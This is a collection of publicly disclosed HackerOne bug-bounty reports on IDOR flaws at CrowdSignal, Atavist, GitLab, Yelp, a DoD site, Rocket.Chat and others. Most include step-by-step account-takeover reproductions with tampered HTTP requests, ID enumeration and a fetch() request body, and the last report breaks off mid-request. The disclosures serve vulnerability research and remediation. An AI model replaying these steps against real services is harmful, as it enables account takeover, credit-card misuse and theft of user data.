- **Reporter:** @bugra
- **Bounty:** - usd
- **Disclosed:** 2020-11-18T14:23:32.970Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hi team,
If you click `Edit` button on any user of your team at https://app.crowdsignal.com/users/list-users.php, you will send a GET request to `https://app.crowdsignal.com/users/invite-user.php?id=(userid)&popup=1`
In this endpoint, `id` parameter is vulnerable for IDOR. When you change the user ID, you will see victim's email in response like that :
{F893392}
And if you click `Update Permissions` button, you will log-in to victim's account directly.
Also, user IDs are sequential. And they have a simple range with `00010006` to `19920500+`

## Steps To Reproduce:

  1. Log-in to your team account at CrowdSignal
  1. Go to https://app.crowdsignal.com/users/invite-user.php?id=19920465&popup=1
  1. You will see my email, and if you click `Update Permissions`, you will takeover my account.
  1. You can change the user ID to random number with `00010006` - `19920500` range.

## Impact

IDOR leads to account takeover without user interaction

Thanks,
Bugra

---

### [IDOR when moving contents at CrowdSignal](https://hackerone.com/reports/915127)

- **Report ID:** `915127`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Automattic
- **Reporter:** @bugra
- **Bounty:** - usd
- **Disclosed:** 2020-11-18T14:22:49.381Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hi team,
You can move your contents via `Move to` button at https://app.crowdsignal.com/dashboard
And when you click to `Move to > My Content` you will send a POST request to `/dashboard` like that :

{F893407}

`actionable[]` parameter's value is the content's ID. And if you change this ID to victim's content ID, you will see victim's content at `My Content` page. But you can't see responses or edit it. You can only change status etc if you have a free account.

So I found another way to takeover victim's content completely via team account.
In team accounts, you have another move option that named `Move to another user`. Basically, you can move your contents to users (in your team) .
And if you follow same steps again but with `Move to another user` option, you can see victim's content in your team user's account.

**Please note, content IDs are sequential, so attacker can takeover any content.**

## Steps To Reproduce:
- **With Free account (limited access to victim's content)**
  1. Go to https://app.crowdsignal.com/dashboard
  1. Click to checkbox on your any content and turn on Intercept at Burp Suite
  1. Click to `Move to > My Content`
  1. And change `actionable[]` parameter's value with victim's content ID.
  1. Go to `My Content`.
- **With Team account (full access to victim's content)**
  1. Add your second email on https://app.crowdsignal.com/users/list-users.php and confirm it
  2. Go to https://app.crowdsignal.com/dashboard
  3. Click to checkbox on your any content and turn on Intercept at Burp Suite
  4. Click to `Move to > Move to another user`
  5. Select your second account, click `Move`
  6. Change `actionable[]` parameter's value with victim's content ID.
  7. Go to your second account and check dashboard

## PoC video for full access to victim's content:
{F893412}

## Impact

IDOR leads to takeover victim's content

Thanks,
Bugra

---

### [IDOR when editing email leads to Account Takeover on Atavist](https://hackerone.com/reports/950881)

- **Report ID:** `950881`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Automattic
- **Reporter:** @bugra
- **Bounty:** - usd
- **Disclosed:** 2020-11-18T14:21:14.912Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hi team,
I created an account on Atavist and checked my settings page.
I can change my email at https://magazine.atavist.com/cms/reader/account with this request :

{F936117}

And as you can see, there is a `id` parameter on request data. It's our user ID, and it's vulnerable for IDOR. So we can change any user's email address.

Also user IDs are sequential so an attacker can change all accounts' email.

## Steps To Reproduce:

  1.Go to https://magazine.atavist.com/login and Login to your account
  1. Go to https://magazine.atavist.com/cms/reader/account and open your proxy program 
  1. Change the email and click `Save`
  1. In request, change the ID to your test account's ID
  1. Forward the request
  1. Now you can reset victim's password via https://magazine.atavist.com/forgot

## Impact

Account Takeover without user interaction

Thanks,
Bugra

---

### [IDOR leads to Edit Anyone's Blogs / Websites](https://hackerone.com/reports/974222)

- **Report ID:** `974222`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Automattic
- **Reporter:** @ali
- **Bounty:** - usd
- **Disclosed:** 2020-11-18T14:20:47.759Z
- **CVE(s):** -

**Vulnerability Information:**

Hello there,
I hope all is well!

Steps:
1. Go to `https://intensedebate.com/signup` and create 2 accounts.
2. Login as victim and go to `https://www.intensedebate.com/edit-user-profile`
3. Click `Add Blog / Website` text and fill the form > click `Save Settings` button
4. Go to `https://www.intensedebate.com/edit-user-profile`, again and search `radMainSite` text in page source and copy value.   
{F975085}
5. Then login as attacker.
6. Go to `https://www.intensedebate.com/edit-user-profile` > click `Add Blog / Website` text and fill the form > click `Save Settings` button
7. Go to `https://www.intensedebate.com/edit-user-profile`, again and click `Save Settings` button > open burp suite and change `hidBlogID` parameter with victim's `hidBlogID`.
8. Forward the request and go to victim's account. Check your website informations. You will see it's changed.

PoC:   
{F975096}

## Impact

Changing victim's website/blog informations.

Best Regards,
@mygf

**Summary (researcher):**

If you want to follow me, here is my linkedin & twitter accounts:
https://twitter.com/alicanact60
https://tr.linkedin.com/in/alicanact60

@mygf

---

### [Security@ email forwarding and Embedded Submission drafts can be used to obtain copy of deleted attachments from other HackerOne users](https://hackerone.com/reports/1034346)

- **Report ID:** `1034346`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** HackerOne
- **Reporter:** @jobert
- **Bounty:** - usd
- **Disclosed:** 2020-11-17T00:42:05.672Z
- **CVE(s):** -

**Vulnerability Information:**

HackerOne has a number of ways for hackers to submit security vulnerabilities to a program, two of which are through an embedded submission form and through security@ email forwarding. These two features can be exploited to update a report draft created through security@ email forwarding that does not belong to the attacker. In addition to that, the attacker can exploit these features to obtain copies of orphaned platform attachments that were uploaded through an embedded submission form and don't belong to the attacker.

# Steps to reproduce
The exploit consists of chaining two vulnerabilities. The first one is an oversight in the access control of report drafts created and updated through an embedded submission form. To reproduce this first vulnerability, a victim will have to send an email that forwards all emails to a HackerOne inbox. An example of such an email address is security@hackerone.com, which forwards emails to our own program. When someone sends an email to this address, they'd receive an email similar to this one:

{F1077716}

In the backend, this essentially does two things: it creates a `ReportDraft` object and a corresponding `Invitation` object. The email above contains the secret invitation token for the user to get access to the report draft. As long as the invitation is not accepted, the `ReportDraft` has its `reporter_id` and `tracer` attributes set to `NULL`. When a user would accept the invite, the `reporter_id` attribute would be overwritten with the user's ID who accepted the invitation. For now, let's not accept the invite and dive into the inner workings of embedded submission forms.

Similar to security@ email forwarding, embedded submission forms allow anonymous users to create a `ReportDraft` object in the backend. This object contains the current state of the embedded submission form to avoid data loss in case the user happens to close their window. To avoid unauthorized access to other anonymous users writing a report at the same time, the frontend generates a UUID to keep track of which attachments belong to the draft. The `ReportDraft` stores this UUID in the `tracer` attribute. Only when the user knows the UUID of this draft will it be able to update the draft. Every request triggered for an unauthenticated session in an embedded submission form will submit this UUID for the backend to authorize the user. This is where the first vulnerability is found.

The `Teams::EmbeddedSubmissionsController` implements a number of actions, which one of which is `draft_sync`:

```ruby
# frozen_string_literal: true

module Teams
  class EmbeddedSubmissionsController < ApplicationController
    # ...
    def draft_sync
      draft = Interactors::ReportDrafts::UpdateOrCreate.interact_without_authorization(
        draft_id: report_params[:draft_id],
        # ...
        handle: team.handle,
        # ...
        attachment_ids: report_params[:attachment_ids],
        as_user: current_user,
        tracer: report_params[:tracer],
      )
    # ...
  end
end
```

HackerOne's backend consolidates business logic, input validation, and authorization into service objects called interactors. This particular interactor is called explicitly without any form of authorization. Among a few other attributes, the interaction is given a `draft_id`, `attachment_ids`, `tracer`, and a reference to the `current_user`, which is an instance of a `User` object or an instance of `UserAuthentication::AnonymousUser`. The `handle` attribute that is given is the program's handle based on embedded submission UUID. At this point, the application **should** determine whether the `current_user` OR a valid `tracer` value is present, but this check is missing. This is the first vulnerability. When the interaction is executed, it tries to look up a draft using the following code (see `draft` method):

```ruby
# frozen_string_literal: true

module Interactors
  module ReportDrafts
    class UpdateOrCreate < HackeroneInteractor
      attribute :draft_id, Integer, required: false
      # ...
      attribute :attachment_ids, Array, default: []
      attribute :tracer, String, required: false

      private

      def execute
        return if draft_id && draft.nil?

        draft.update(
          # ...
        )

        draft
      end

      # ...

      def draft
        @draft ||= if draft_id
          ReportDraft.find_by(
            id: draft_id,
            team: team,
            reporter: nil_or_current_user,
            tracer: tracer,
          )
        else
          ReportDraft.find_or_initialize_by(
            team: team,
            reporter: nil_or_current_user,
            tracer: tracer,
          )
        end
      end

      # ...

      def nil_or_current_user
        current_user.is_a?(User) ? current_user : nil
      end
    end
  end
end
```

Stepping through the code, a user can see that if a `draft_id` is present, the system will try to look up a `ReportDraft` object by a tracer UUID and reporter. Going back to the security@ email forwarding, we know that there are `ReportDraft` objects that have a `tracer` or `reported_by_id` attribute set to `NULL`. This means that an attacker can, by guessing a draft ID created through the security@ email forwarding feature, change the contents of a draft by completely removing the `tracer` value from a draft sync that is initiated through the embedded submission form. Here is an excerpt of that request:

```http
POST /80b9bc53-a236-445d-a7e4-553828b7d533/embedded_submissions/draft_sync HTTP/2
Host: hackerone.com
...

{
  "draft_id": "1",
  "title": "This becomes the new title for draft 1",
  "vulnerability_information":"This becomes the new vulnerability information for draft 1"
}
```

Once the victim claims the invitation through the email that was shown earlier, they'll see the updated vulnerability information and title.

{F1077723}

You can see that the interaction passes *all* attributes to the `update` call, see `Interactors::ReportDrafts::UpdateOrCreate#execute`. This means that the attacker can only change *all* attributes, reducing the likelihood of the expoitation. However, due to the fact that this allows an attacker to change report drafts, the impact on the integrity is set to high. It could be used to tamper with drafts that are in the process of being submitted to a live program.

To further increase the severity of the vulnerability, it can be chained with another vulnerability. When a user uploads an attachment through an embedded submission form, it'll create an `Attachment` object that belongs to the `ReportDraft` object. In the backend, its attributes will look like this:

```json
{
  "id": "1",
  "uploaded_by_id": null,
  "attachable_id": 1,
  "attachable_type": "ReportDraft"
}
```

The `attachable_id` and `attachable_type` form a polymorphic relation to any other persistent model in HackerOne's database. As long as the user is working on its report, the attachment references a `ReportDraft` object. On submission, it'll transfer the ownership to the `Report` that was created – this is the report that customers see. ActiveRecord, the ORM HackerOne uses, has logic to (conveniently) disassociate a polymorphic relation when the model referencing the polymorphic relation overwrites the IDs. To show this, consider the following code example:

```ruby
# Create an attachment. At this time, the `attachable_id` and `attachable_type` are set to `NULL`
attachment = Attachment.create!

# Create another attachment. At this time, the `attachable_id` and `attachable_type` are set to `NULL`
another_attachment = Attachment.create!

# Create a report draft and reference the first attachment. The `attachable_id` and `attachable_type` of the attachment are updated to reference the created report draft.
report_draft = ReportDraft.create! attachment_ids: [attachment.id]

# Update the attachment IDs of a report draft. This will do two things:
#   - update `attachment.attachable_id` to `NULL`
#   - update `another_attachment.attachable_type` to `ReportDraft`
#   - update `another_attachment.attachable_id` to `report_draft.id`
report_draft.update! attachment_ids: [another_attachment.id]
```

This means that the `attachment`, as created in the above code example, is not referencing any object at all. There is a code path in HackerOne's platform to get an attachment in this state: upload an attachment using an embedded submission form, then clicking the "X" to remove it, and type one character in the vulnerability information field to trigger a draft sync. This will leave the first attachment in an orphaned state that has its `uploaded_by_id` and `attachable_id` set to `NULL`. Going back to the `Interactors::ReportDrafts::UpdateOrCreate` interactor, there's a method that associates attachments to a `ReportDraft` with the following logic:

```ruby
# ...
def valid_attachments
  (
    draft.attachments.with_attached_file.where(id: attachment_ids) +
    Attachment.with_attached_file.where(
      id: attachment_ids,
      attachable_id: nil,
      uploaded_by: nil_or_current_user,
    )
  ).uniq
end
# ...
```

The code that contains the vulnerability is the second `Attachment` lookup: it selects all attachment objects that don't have an `attachable_id` set and that are uploaded by an anonymous user. This means that any attachment that was uploaded by an anonymous user and removed the attachment from a draft can be associated with the attacker's report draft. There are 823 attachments that match this criteria.

An attacker can exploit this chain using the following steps:

1. in an authenticated session, start typing a report to any program. Observe the network traffic for the `draft_sync` endpoint to determine the latest report draft ID, which is included in the response (e.g. 1).
1. in the same session, upload an attachment and observe which ID was associated (e.g. 5).
1. send an email to the program's email forwarding address (e.g. security@hackerone.com). This will create a report draft with an ID that is one to ~ ten IDs up from the report draft the authenticated user created.
1.  in an incognito browser, go to the program's embedded submission form URL. An example is [HackerOne's own form](https://hackerone.com/80b9bc53-a236-445d-a7e4-553828b7d533/embedded_submissions/new). Start typing and intercept the request to the `draft_sync` endpoint.
1. change the `draft_id` to the ID obtained in step 1 and completely remove the `tracer` value from the request.
1. set the `attachment_ids` to an array containing *all* possible attachment IDs from 1 to the ID obtained in step 2
1. claim the report draft through the invitation you received
1. in the UI, observe that the attachments belonging to the victim are attached to the report draft
1. copy the ID and inline them in the vulnerability information field, e.g. `{F5}`
1. in the report preview section, click the link to obtain a copy of the victim's attachment

## Impact

The first vulnerability can be used to change the contents of a number of draft reports that were created through the security@ email forwarding feature. However, chaining the two vulnerabilities would increase the severity as it would allow an attacker to associate orphaned `Attachment` objects to its own report draft, potentially containing sensitive information. The attacker does not have to be authenticated in order to exploit this vulnerability.

---

### [IDOR + Account Takeover  [UNAUTHENTICATED]](https://hackerone.com/reports/1004750)

- **Report ID:** `1004750`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @silentbreach
- **Bounty:** - usd
- **Disclosed:** 2020-11-09T18:28:19.706Z
- **CVE(s):** -

**Vulnerability Information:**

1- Open the burp suite.
2- Switch the "Repeater" tab.
3- Paste the content of the attached request into the repeater.
4- Replace the "UID2 = 4820041" value in the cookie with the ID value of the user to be attacked. Also write the user's email in the "userName" input.
5- Replace the victim user's password

**Note: Follow the steps in the "1004745" report to get the user's email address.**

## Impact

You can change users' passwords and take over their account.

---

### [IDOR to Account Takeover on https://████/index.html](https://hackerone.com/reports/969223)

- **Report ID:** `969223`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @nagli
- **Bounty:** - usd
- **Disclosed:** 2020-09-29T20:30:56.276Z
- **CVE(s):** -

**Vulnerability Information:**

Hello Team!

**Summary:**

I found when you wish to update your profile on https://███████/ after your login through https://██████████/signIn/signIn.html website due to an IDOR.

This IDOR gives you the opportunity to change the origin email for the registered account by changing the ID parameter on the following request, i assume that if i would do it on the id=1 i would takeover the admin account, this is due to not requiring the OLD password to make an email change, aswell as no restriction to make POST actions on different account IDS.


**Description:**

IDOR chained to full Account Takeover on ██████ domain.

Account
## Step-by-step Reproduction Instructions

1. Register an account at https://█████████/signIn/CreateAccount.html (Attacker)
2. Login to your account and go the https://███████/signIn/account page
3. Click on the "update" button located at thetop middle, and capture the request on BURP
4. Now change the ID parameter on the request to the victims, change the email, and you successfully have managed to switch his email.

Request:

███


Video PoC:

█████

## Suggested Mitigation/Remediation Actions

1. Implementing email request change based on OLD password input
2. Returning 403/401 when user account attempts to change another user ID settings.

## Disclaimer

as you might notice the domain is https://██████/signIn/signIn.html when you sign in (.mil site), and it redirects you afterwards to https://██████████/ with the Compromised account, therefore i considered this In Scope.

Best Regards,
Nagli

## Impact

Issuing the malicious request on the victim account ID will lead to account takeover by replacing the email of the victim with the email of the attacker, and requesting a new password using the Forgot password option.

**Summary (team):**

More details about the report could be found at my blogpost:
https://naglinagli.github.io/DoD_IDOR/ 

I would like to thank the DoD for a quick triage and resolution regarding the issue.

---

### [Adding everyone to the repo due to the lack of rate limit](https://hackerone.com/reports/978768)

- **Report ID:** `978768`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** GitLab
- **Reporter:** @sadd_man
- **Bounty:** - usd
- **Disclosed:** 2020-09-14T23:28:30.952Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

Since there is no rate limit in the inviting users to the repository section, it is possible to add all users on gitlab to a repository.

### Steps to reproduce

(Step-by-step guide to reproduce the issue, including:)

1. Create a repository
2. go to the project members section
3. choose a random user
4. before clicking the invite button, we need to capture the request with the burp suite..
5. ███████
6. Send it to the Intruder module, specify the █████ field here between 1 and 7006996 and send the request.

### Impact

It is possible to collect all users on Gitlab in a single repository, so users' mailboxes will be filled with notifications.


### Note

Because the rate limit is out of scope, I tested it and I could not stop the python script, and there were users affected.

## Impact

It is possible to collect all users on Gitlab in a single repository, so users' mailboxes will be filled with notifications.

---

### [Stealing data from customers.gitlab.com without user interaction](https://hackerone.com/reports/674195)

- **Report ID:** `674195`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** GitLab
- **Reporter:** @rpadovani
- **Bounty:** - usd
- **Disclosed:** 2020-08-26T14:02:00.620Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

An attacker can link her own customers.gitlab.com account to the one of the victim, and these give access to 3 different vulnerabilities:
- destroying subscriptions of the victim
- buying new subscriptions using victim credit card for its own groups
- some (minor) information disclosure about what is over Gitlab.com

### Steps to reproduce

The attacker registers herself on customers.gitlab.com, logging in using her Gitlab.com account. 
After that, she updates her customers.gitlab.com account and link it to the victim's Gitlab account through the victim's account userId (they are sequential and they are not secret, so no problem retrieving it).

This update is quite easy, attacker needs only to copy how "Update Account" HTTP request, and change the `customer%5Buid%5D` field, like this:

```
await fetch("https://customers.gitlab.com/customers", {
    "credentials": "include",
    "referrer": "https://customers.gitlab.com/customers/edit",
    "body": "utf8=%E2%9C%93&_method=patch&authenticity_token=YOquJGc9evhkHMfLOZljuw9OcDn0gtJw8AHPb0yVhyml9q1TISGHa%2FK57DAlg8jB%2BEqvJYYob26BRgx4sZbRzg%3D%3D&customer%5Bfirst_name%5D=Riccardo&customer%5Blast_name%5D=Padovani&customer%5Baddress_1%5D=&customer%5Baddress_2%5D=&customer%5Bcity%5D=Munich&customer%5Bzip_code%5D=81479&customer%5Bcountry%5D=DEU&customer%5Bstate%5D=BY&customer%5Bvat_code%5D=&customer%5Bcompany%5D=Riccardo+Padovani&customer%5Bemail%5D=hackerone1%40rpadovani.com&customer%5Bprovider%5D=gitlab&customer%5Buid%5D=VICTIM_ID",
    "method": "POST",
    "mode": "cors"
});
```

The backend will validate the input, and now the two accounts are somehow linked.

### Impact

- When the victim will login again, all his subscriptions will be lost
- If the victim updates his data after the attack, the attacker account will be updated with the same data, INCLUDING CREDIT CARD. The attacker can now purchase plans using victim's credit card
- Attacker has also a list of teams victim is owner, when she purchases a new plan.

If attacker wants to purchase a plan for her own group, she can nominate victim owner, so now attacker's group will be in the dropdown, buy the plan, remove the victim.

### Examples

I attached a video with all these attacks, sorry but it is a bit messy.
On the left there is victim's browser, on the right attacker's browser. When it appears a console, is for the attacker's browser. The attacker's is in a private session, so it is completely separated from the victim.

0:00-0:10: we see victim has a subscription, and attacker no. They also have different data
0:10-0:40: attacker does a first attack, changing both uid and email, and it doesn't work
0:40-1:10: attacker does a proper attack, changing only uid. Notice how bottom right the Gitlab.com account changes
1:10-1:30: nothing else has changed
1:30-1:50: victim does log out and login again and ALL DATA AND SUBSCRIPTIONS ARE GONE

You can skip to
2:30-2:40: victim updates his data, also attacker's data are updated accordingly
2:40-4:30: victim buys a new subscription 
4:30-5:00: attackers can use victim's credit card

### What is the current *bug* behavior?

customers.gitlab.com user can update its link to Gitlab.com without any verification

### End notes:

I'd like you also reset my customers.gitlab.com accounts, now they are all a bit a mess.

Also, while testing I think I associated my customers.gitlab.com account with Gitlab's account with UID 1 due an error in copy-paste. I removed immediately the link, but maybe you should check if the link is indeed being delete, and say sorry on my behalf to Sid!

I noticed that in the video it appears my CC data - so please do not disclose the issue, also on the Gitlab.com issue tracker, without removing the video first, please!

## Impact

Attackers can steal victim's data, including last 4 numbers of CC, and use victim's CC to buy subscriptions

---

### [I.D.O.R To Order,Book,Buy,reserve On YELP FOR FREE (UNAUTHORIZED USE OF OTHER USER'S CREDIT CARD)](https://hackerone.com/reports/391092)

- **Report ID:** `391092`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Yelp
- **Reporter:** @hk755a
- **Bounty:** - usd
- **Disclosed:** 2020-08-19T01:11:07.489Z
- **CVE(s):** -

**Summary (team):**

@hk755a found an Insecure Direct Object Reference (IDOR) Vulnerability that allowed an attacker to pay with someone else's registered credit card, while ordering food with Grubhub through the `/checkout/transaction_platform` endpoint. No credit card information was disclosed as a result of this vulnerability.

This is yet another vulnerability in @hk755a's collection of IDOR reports, and we appreciate their diligent effort in working with the Yelp Security team to prevent others from obtaining free food through our system!

**Summary (researcher):**

There was an Insecure Direct Object Reference Vulnerability that allowed the attacker to pay from someone else's credit card while purchasing orders (or to be precise, Ordering Food) on yelp through the "/checkout/transaction_platform" endpoint, thus making the order's free for himself. The vulnerability had the potential to affect all the credit cards saved on yelp.com (1,500,000+).

Yelp validated and fixed the vulnerability within a few hours, thus showing their concern for user's security! Special thanks to @Calvinli for sharing credit_card_id which allowed the validation of the bug.

---

### [Idor for firstpromoter service](https://hackerone.com/reports/959697)

- **Report ID:** `959697`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Dropcontact
- **Reporter:** @xploiterr
- **Bounty:** - usd
- **Disclosed:** 2020-08-18T10:13:31.333Z
- **CVE(s):** -

**Summary (team):**

An IDOR has been detected on firstpromoter service

---

### [Singapore - Account Takeover via IDOR](https://hackerone.com/reports/876300)

- **Report ID:** `876300`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Starbucks
- **Reporter:** @ko2sec
- **Bounty:** - usd
- **Disclosed:** 2020-07-28T19:44:31.919Z
- **CVE(s):** -

**Summary (team):**

ko2sec discovered that an alternate site shared database and cookie credentials with card.starbucks.com.sg. By exploiting an endpoint on the alternate site, ko2sec was able to copy a PHPSESSID cookie value from that site over to card.starbucks.com.sg and then see user information, update the password and perform an account takeover. ko2sec was awarded a bounty multiplier for this report as they had also submitted a 2nd report for another site that mimicked this behavior.

@ko2sec — thank you for reporting this vulnerability and for confirming the resolution.

---

### [IDOR with Geolocation data not stripped from images](https://hackerone.com/reports/906907)

- **Report ID:** `906907`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** IRCCloud
- **Reporter:** @do_some_hack
- **Bounty:** 200 usd
- **Disclosed:** 2020-07-26T15:36:33.868Z
- **CVE(s):** -

**Vulnerability Information:**

Vulnerable URL :-   ████

Vulnerability Discription:
When an image is taken using a smartphone or camera certain metadata fields are often attached to it. These fields could include the model of the camera, the time it was taken, whether the flash was used, the shutter speed, focal length, light value and even the location. In Inturn, while uploading the image as a profile picture, the exif data is not stripped from images. The exif data in images contains sensitive data like Geoloacation, latitude, longitude, etc. Also it contains the camera information and other details. 

And your website vulnerable to image IDOR which allows attacker to see other users images and retrive data using tool.

Tools Used: exiftool.

Steps TO reproduce:

Use  2 accounts in two browser

Download images from here 

https://github.com/ianare/exif-samples/tree/master/jpg/gps

1)In 1st account in network user can upload files just upload the image their and open image link in new tab.

 new tab that image url like

██████████

2)In second account do same things and that url like down 

█████

3) Change 1st account Url parameter value to 2nd acoount Url parameter(see poc for it).

4) now image will shows up copy that url again and paste it to image data retrival website

http://exif.regex.info/exif.cgi

5) and see sensitive data   exposed.

## Impact

1) By this the attacker tracks your location and use it for personal things.
2) Sensitive data exposed.

---

### [Read-Only user can delete users](https://hackerone.com/reports/888729)

- **Report ID:** `888729`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Helium
- **Reporter:** @amr_
- **Bounty:** - usd
- **Disclosed:** 2020-07-10T18:30:21.337Z
- **CVE(s):** -

**Vulnerability Information:**

hello 
this endpoint (DELETE /api/invitations/0ff7e9f9-877a-40cc-b99f-f6b3b1bea3f8 )vulnerable  to Insecure Direct Object Reference
Steps to reproduce the bug
Let's assume that three accounts exist:
admin@helium.com        (role Administrator)
attacker@helium.com   (role Read-Only)
victim@helium.com        (invited user )
all three account in same organization (h1)
attacker@helium.com cant delete victim@helium.com but we can do that 
from admin@helium.com go to delete victim@helium.com 
request like that DELETE /api/invitations/0ff7e9f9-877a-40cc-b99f-f6b3b1bea3f8
take id victim@helium.com 0ff7e9f9-877a-40cc-b99f-f6b3b1bea3f8
go to attacker@helium.com switch another organization (h2)
and go to delete invited user from this organization(h2)
DELETE /api/invitations/a996881d-7177-43fb-be7c-da3a6b005f40
change id (a996881d-7177-43fb-be7c-da3a6b005f40) to id you got from admin@helium.com(0ff7e9f9-877a-40cc-b99f-f6b3b1bea3f8)
respond 
HTTP/1.1 204 No Content
Date: Mon, 01 Jun 2020 18:47:43 GMT
Content-Length: 0
Connection: close
Cache-Control: max-age=0, private, must-revalidate
Message: User removed from organization
Strict-Transport-Security: max-age=31536000
Via: 1.1 vegur
CF-Cache-Status: DYNAMIC
cf-request-id: 0312cf14d40000edeb299e9200000001
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 59cb1ace2eeaedeb-CDG

now account victim@helium.com deleted from attacker@helium.com
i can make poc 
thanks

## Impact

Read-Only user can delete users

---

### [account takeover on 3.0.1 version](https://hackerone.com/reports/842625)

- **Report ID:** `842625`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Rocket.Chat
- **Reporter:** @elfiman
- **Bounty:** - usd
- **Disclosed:** 2020-06-14T15:22:44.184Z
- **CVE(s):** -

**Vulnerability Information:**

I find user reset password hash info and other security info on "/api/v1/[users.info](http://users.info)"  
note : I login on rocketchat with ldap account (my role : user)  
note: in request "[https://target/api/v1/users.info?username=[x]](https://target/api/v1/users.info?username=%5Bx%5D)" you should change usrname to userId

1- please login with user ldap account (role user)  
2- send a request to&nbsp;[https://target/api/v1/users.list](https://target/api/v1/users.list)&nbsp;and copy \_id value  
3- send a request to&nbsp;[https://target/api/v1/users.info?userId=[userId]](https://target/api/v1/users.info?userId=%5BuserId%5D)&nbsp;and copy email value (in response you can see important security information )  
4- logout and click "forget your password" link on&nbsp;[https://target/home](https://target/home)&nbsp;and send an email to above email address that you copied  
4- login with Your account and send a request to&nbsp;[https://target/api/v1/users.list](https://target/api/v1/users.list)&nbsp;and search the same email in response and copy \_id value  
5- send a request to&nbsp;[https://target/api/v1/users.info?userId=[userId]](https://target/api/v1/users.info?userId=%5BuserId%5D)&nbsp;and copy reset hash value  
6- logout your account and send a request to&nbsp;[https://target/reset-password/[reset\_hash]](https://target/reset-password/%5Breset_hash%5D)  
7- set new password  
8- login and enjoy

## Impact

account takeover

---

### [Full Account Take-Over of ████████ Members via IDOR](https://hackerone.com/reports/847452)

- **Report ID:** `847452`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @r00tpgp
- **Bounty:** - usd
- **Disclosed:** 2020-05-14T18:08:23.515Z
- **CVE(s):** -

**Vulnerability Information:**

##Summary
https://███████ is a Social Network Site belonging to US DoD. Membership is open to anyone, I have found a method to fully take-over any members' account by exploiting an IDOR bug in the `██████████` end-point. By changing the following values in the `POST` request to the affected end-point:

`userName`
`originalEmail`
`Email`
`RecoveryEmail`

I am able to add Recovery Email address of my choice, thus, enabling me to send a password reset link to my attacker controlled email address. I have uploaded a video PoC to demo my finding. Note that the following test accounts were used:

###Attacker
login: ████████

###Victim
login: ███████

I added `████` email into the victim account. Note that this only works on victims that have no recovery email address defined or recovery email that are not yet verified. This technique will NOT work on victims' that already have a confirmed recovery email address.

Also note, that I am using multi-containers plugin for Firefox, therefore, each tab represents separate browser session. Finally, note that in my PoC video, I had to insert the victim recovery email link `████████/self?guid=█████████` into the attackers' session because a valid session is required to validate the email. The session does not necessary have to belong to the victims' session to validate.

The IDOR bug can be obtained by intercepting the 2-FA Authentication switch:

███


## Vulnerable End-Point

Here is the vulnerable POST request when captured, the cookies and `__RequestVerificationToken` must be valid for this attack to work, I have ==highlighted== the vulnerable IDOR parameters:

POST /self HTTP/1.1
Host: █████████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://███/self
Content-Type: application/x-www-form-urlencoded
Content-Length: 739
Connection: close
Cookie: ███████-Http-Session=███; _ga=█████; _gid=███; AWSALB=█████; AWSALBCORS=████; ASP.NET_SessionId=██████████; BIGipServer~Sync_Only~passport_pool=█████; akaalb_albcustom=█████████████def~id=██████████; AWSALB=███; AWSALBCORS=██████; googtrans=/en/en; googtrans=/en/en; UserName=███████████; CAMS_SID_MYCAMSCLUSTER_SYSTEM=MyCamsCluster-MyCamsServer1-system-███; _gat_███Tracker=1; __RequestVerificationToken_Lw__=█████
Upgrade-Insecure-Requests: 1

__RequestVerificationToken=█████████&==userName=████&originalEmail=████████%40gmail.com&oldPassword=&EmailSent=False&RecoveryEmailSent=true&RecoveryEmailVerified=true&SecurityImagePath=&Translate=en&COIGroupID=&Username=█████████&Email=██████████%40gmail.com&ConfirmEmail=&RecoveryEmail=██████████&ConfirmRecoveryEmail=&NewPassword=&ConfirmPassword=&TwoFactorAuthenticationEnabled=false&Password=&Password=&Password=&Password=&Password===

## Impact

An attacker can add his email address into the recovery field of any █████████ member that has not yet defined or verified a Recovery Email address. He will then be able to force a password reset link to be sent to his email address and change the victims' password and login into victims' account. Attacker now has full control of victims' account.

Also, victim login id is easily retrievable from this end point. By running the `RequesteeId` using any valid user session, attacker is  able to retrieve the `ProfileUrl` containing the victims' login id.

##Request

POST /api.ashx/v2/users/████/friends.json HTTP/1.1
Host: █████████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: application/json, text/javascript, /; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Authorization-Code: █████████
Rest-Authorization-Code: █████████
X-Requested-With: XMLHttpRequest
Content-Length: 35
Origin: https://████
Connection: close
